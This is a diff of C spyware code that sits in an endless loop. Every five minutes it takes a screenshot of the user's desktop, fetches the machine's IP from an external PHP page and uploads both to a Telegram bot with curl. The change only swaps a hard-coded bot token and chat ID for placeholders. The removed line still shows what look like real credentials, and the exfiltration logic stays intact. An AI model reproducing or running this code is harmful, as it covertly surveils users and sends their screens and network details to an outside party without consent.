@@ -5,7 +5,7 @@
 		while(1==1){
 		system("gnome-screenshot -f /tmp/ehuehue.png | :");
 		strcat(code,"caption=\"$(curl http://haydo.esy.es/workspace/AliRiza/ip.php)\";");
-		strcat(code,"curl -s -X POST \"https://api.telegram.org/bot301147721:AAFizhCHrY0aHpyCCGUE3a2yQSgr_aQHfcI/sendPhoto\" -F chat_id=\"-1001100970990\" -F photo=\"@/tmp/ehuehue.png\" -F caption=$caption");
+		strcat(code,"curl -s -X POST \"https://api.telegram.org/bot<token>/sendPhoto\" -F chat_id=\"<chatid>\" -F photo=\"@/tmp/ehuehue.png\" -F caption=$caption");
 		system(code);
 		system("rm -f /tmp/ehuehue.png | :");
 		system("sleep 300 | :");
